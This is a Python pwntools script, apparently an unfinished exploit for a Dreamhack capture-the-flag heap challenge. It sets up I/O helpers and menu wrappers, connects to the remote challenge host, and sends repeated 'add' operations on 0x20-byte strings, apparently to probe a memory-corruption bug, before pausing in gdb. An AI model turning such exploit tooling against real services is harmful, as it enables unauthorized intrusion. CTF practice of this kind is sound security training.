#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.binary = elf = ELF('./prob')
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

HOST, PORT = "host3.dreamhack.games 8296".split()

def slog(n, a): return info(": ".join([n, hex(a)]))

s       = lambda data               :p.send(data)
sa      = lambda delim, data        :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim, data        :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda                    :p.recvline()
ru      = lambda delim, drop=True   :p.recvuntil(delim, drop)
l64     = lambda                    :u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

if args.REMOTE:
    p = remote(HOST, PORT)
    libc = ELF('./libc.so.6') # or other exact path
else:
    p = process(env={"LD_PRELOAD":"./libc.so.6"}) # or env can be added
    libc = ELF('./libc.so.6')

def create(idx, t, v=None, l=None): # v = value, l = len
    sla(b'cmd > ', b'1')
    sla(b'idx > ', str(idx).encode())
    sla(b'type > ', str(t).encode())

    if t == 11:
        sla(b'len > ', str(l).encode())
        sa(b'value > ', v if isinstance(v, bytes) else v.encode())
    else:
        sla(b'value > ', str(v).encode())

def show(idx):
    sla(b'cmd > ', b'2')
    sla(b'idx > ', str(idx).encode())

def add(idx1, idx2):
    sla(b'cmd > ', b'3')
    sla(b'idx1 > ', str(idx1).encode())
    sla(b'idx2 > ', str(idx2).encode())

create(2,11,b"A"*0x20,0x20)
create(3,11,b"B"*0x20,0x20)
add(2,3)
add(2,3)

gdb.attach(p)
pause()

p.interactive()